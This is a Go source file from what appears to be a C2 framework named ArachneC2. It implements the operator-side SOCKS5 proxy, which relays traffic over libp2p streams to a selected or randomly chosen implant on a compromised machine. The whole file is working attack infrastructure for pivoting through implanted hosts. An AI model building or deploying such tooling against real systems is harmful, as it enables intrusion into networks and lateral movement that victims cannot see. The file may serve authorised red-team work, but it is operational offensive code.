package core

import (
	"bufio"
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"path/filepath"
	"time"

	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
	"golang.org/x/crypto/bcrypt"

	"github.com/portbuster1337/ArachneC2/pkg/transport"
)

type SocksInstance struct {
	Port       int
	ImplantID  string
	Username   string
	Listener   net.Listener
	Cancel     context.CancelFunc
	StartTime  time.Time
	Random     bool
}

type SocksCreds struct {
	Username     string `json:"username"`
	PasswordHash string `json:"password_hash"`
}

func socksConfigPath() string {
	return filepath.Join(arachneDir(), "socks.json")
}

func LoadSocksCreds() (*SocksCreds, error) {
	data, err := os.ReadFile(socksConfigPath())
	if err != nil {
		return nil, err
	}
	c := &SocksCreds{}
	if err := json.Unmarshal(data, c); err != nil {
		return nil, err
	}
	return c, nil
}

func SaveSocksCreds(c *SocksCreds) error {
	data, err := json.MarshalIndent(c, "", "  ")
	if err != nil {
		return fmt.Errorf("marshal socks creds: %w", err)
	}
	return os.WriteFile(socksConfigPath(), data, 0600)
}

func ClearSocksCreds() error {
	return os.Remove(socksConfigPath())
}

func hashPassword(password string) (string, error) {
	bytes, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		return "", fmt.Errorf("bcrypt hash: %w", err)
	}
	return string(bytes), nil
}

func checkPassword(password, hash string) bool {
	return bcrypt.CompareHashAndPassword([]byte(hash), []byte(password)) == nil
}

func (o *Operator) pickImplantPeerID(idArg string) (string, *ImplantRecord, error) {
	implants := o.ListImplants()
	var connected []*ImplantRecord
	for _, rec := range implants {
		if !rec.Disconnected {
			connected = append(connected, rec)
		}
	}
	if len(connected) == 0 {
		return "", nil, fmt.Errorf("no connected implants")
	}

	if idArg == "random" {
		choice := connected[rand.Intn(len(connected))]
		return choice.PeerID, choice, nil
	}

	if idArg == "" {
		return "", nil, fmt.Errorf("specify an implant index or 'random'")
	}

	idx, err := strconvAtoi(idArg)
	if err != nil {
		return "", nil, fmt.Errorf("bad index %q", idArg)
	}
	if idx < 0 || idx >= len(connected) {
		return "", nil, fmt.Errorf("index %d out of range (0-%d)", idx, len(connected)-1)
	}
	rec := connected[idx]
	return rec.PeerID, rec, nil
}

func (o *Operator) pickRandomImplant() (*ImplantRecord, error) {
	implants := o.ListImplants()
	var connected []*ImplantRecord
	for _, rec := range implants {
		if !rec.Disconnected {
			connected = append(connected, rec)
		}
	}
	if len(connected) == 0 {
		return nil, fmt.Errorf("no connected implants")
	}
	return connected[rand.Intn(len(connected))], nil
}

func strconvAtoi(s string) (int, error) {
	n := 0
	for _, c := range s {
		if c < '0' || c > '9' {
			return 0, fmt.Errorf("not a number")
		}
		n = n*10 + int(c-'0')
	}
	return n, nil
}

func (o *Operator) SocksStart(implantPeerID string, port int, username, password string) error {
	random := implantPeerID == "random"

	var pid peer.ID
	if random {
		rec, err := o.pickRandomImplant()
		if err != nil {
			return fmt.Errorf("no implants available for random socks: %w", err)
		}
		pid, err = peer.Decode(rec.PeerID)
		if err != nil {
			return fmt.Errorf("decode random implant peer id: %w", err)
		}
		implantPeerID = rec.PeerID
		log.Printf("[socks] random selection picked implant %s@%s", rec.Name, rec.PeerID)
	} else {
		var err error
		pid, err = peer.Decode(implantPeerID)
		if err != nil {
			return fmt.Errorf("decode peer id %s: %w", implantPeerID, err)
		}
	}

	o.socksMu.Lock()
	if _, exists := o.socksProxies[port]; exists {
		o.socksMu.Unlock()
		return fmt.Errorf("SOCKS proxy already running on port %d", port)
	}
	o.socksMu.Unlock()

	listener, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", port))
	if err != nil {
		return fmt.Errorf("listen 127.0.0.1:%d: %w", port, err)
	}

	ctx, cancel := context.WithCancel(o.ctx)

	inst := &SocksInstance{
		Port:      port,
		ImplantID: implantPeerID,
		Username:  username,
		Listener:  listener,
		Cancel:    cancel,
		StartTime: time.Now(),
		Random:    random,
	}

	o.socksMu.Lock()
	o.socksProxies[port] = inst
	o.socksMu.Unlock()

	log.Printf("[socks] SOCKS5 proxy on 127.0.0.1:%d -> implant %s (auth: %s)", port, implantPeerID, username)

	go func() {
		<-ctx.Done()
		listener.Close()
		o.socksMu.Lock()
		delete(o.socksProxies, port)
		o.socksMu.Unlock()
	}()

	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				return
			}
			go o.handleSocksConn(conn, pid, username, password, random)
		}
	}()

	return nil
}

func (o *Operator) SocksList() []*SocksInstance {
	o.socksMu.Lock()
	defer o.socksMu.Unlock()
	out := make([]*SocksInstance, 0, len(o.socksProxies))
	for _, inst := range o.socksProxies {
		out = append(out, inst)
	}
	return out
}

func (o *Operator) SocksStop(port int) error {
	o.socksMu.Lock()
	inst, ok := o.socksProxies[port]
	o.socksMu.Unlock()

	if !ok {
		return fmt.Errorf("no SOCKS proxy running on port %d", port)
	}

	inst.Cancel()
	return nil
}

func (o *Operator) handleSocksConn(client net.Conn, implantID peer.ID, username, password string, _ bool) {
	defer client.Close()

	br := bufio.NewReader(client)
	_ = client.SetDeadline(time.Now().Add(30 * time.Second))

	ver, err := br.ReadByte()
	if err != nil || ver != 5 {
		return
	}

	nmethods, err := br.ReadByte()
	if err != nil {
		return
	}

	methods := make([]byte, nmethods)
	if _, err = io.ReadFull(br, methods); err != nil {
		return
	}

	authRequired := username != ""
	offersAuth := false
	for _, m := range methods {
		if m == 2 {
			offersAuth = true
			break
		}
	}

	if authRequired && !offersAuth {
		client.Write([]byte{5, 0xff})
		return
	}

	if offersAuth {
		client.Write([]byte{5, 2})

		aver, err := br.ReadByte()
		if err != nil || aver != 1 {
			return
		}

		ulen, err := br.ReadByte()
		if err != nil {
			return
		}
		unameBytes := make([]byte, ulen)
		if _, err = io.ReadFull(br, unameBytes); err != nil {
			return
		}

		plen, err := br.ReadByte()
		if err != nil {
			return
		}
		passBytes := make([]byte, plen)
		if _, err = io.ReadFull(br, passBytes); err != nil {
			return
		}

		if string(unameBytes) != username || string(passBytes) != password {
			client.Write([]byte{1, 1})
			return
		}
		client.Write([]byte{1, 0})
	} else {
		client.Write([]byte{5, 0})
	}

	req := make([]byte, 4)
	if _, err = io.ReadFull(br, req); err != nil {
		return
	}

	if req[0] != 5 || req[1] != 1 {
		client.Write([]byte{5, 7, 0, 1, 0, 0, 0, 0, 0, 0})
		return
	}

	var host string
	switch req[3] {
	case 1:
		addr := make([]byte, 4)
		if _, err = io.ReadFull(br, addr); err != nil {
			return
		}
		host = net.IP(addr).String()
	case 3:
		addrLen, err := br.ReadByte()
		if err != nil {
			return
		}
		addr := make([]byte, addrLen)
		if _, err = io.ReadFull(br, addr); err != nil {
			return
		}
		host = string(addr)
	case 4:
		addr := make([]byte, 16)
		if _, err = io.ReadFull(br, addr); err != nil {
			return
		}
		host = net.IP(addr).String()
	default:
		client.Write([]byte{5, 8, 0, 1, 0, 0, 0, 0, 0, 0})
		return
	}

	portBytes := make([]byte, 2)
	if _, err = io.ReadFull(br, portBytes); err != nil {
		return
	}
	port := binary.BigEndian.Uint16(portBytes)
	target := net.JoinHostPort(host, fmt.Sprintf("%d", port))

	client.SetDeadline(time.Time{})

	ctx, cancel := context.WithTimeout(o.ctx, 15*time.Second)
	defer cancel()
	ctx = network.WithAllowLimitedConn(ctx, "socks")

	s, err := o.node.NewStream(ctx, implantID, transport.SocksProtocolID)
	if err != nil {
		log.Printf("[socks] stream to %s: %v", implantID.String(), err)
		client.Write([]byte{5, 1, 0, 1, 0, 0, 0, 0, 0, 0})
		return
	}
	defer s.Close()

	if _, err := fmt.Fprintf(s, "%s\n", target); err != nil {
		log.Printf("[socks] send target: %v", err)
		client.Write([]byte{5, 1, 0, 1, 0, 0, 0, 0, 0, 0})
		return
	}

	client.Write([]byte{5, 0, 0, 1, 0, 0, 0, 0, 0, 0})

	done := make(chan struct{}, 2)
	go func() {
		io.Copy(s, br)
		done <- struct{}{}
	}()
	go func() {
		io.Copy(client, s)
		done <- struct{}{}
	}()
	<-done
	<-done
}
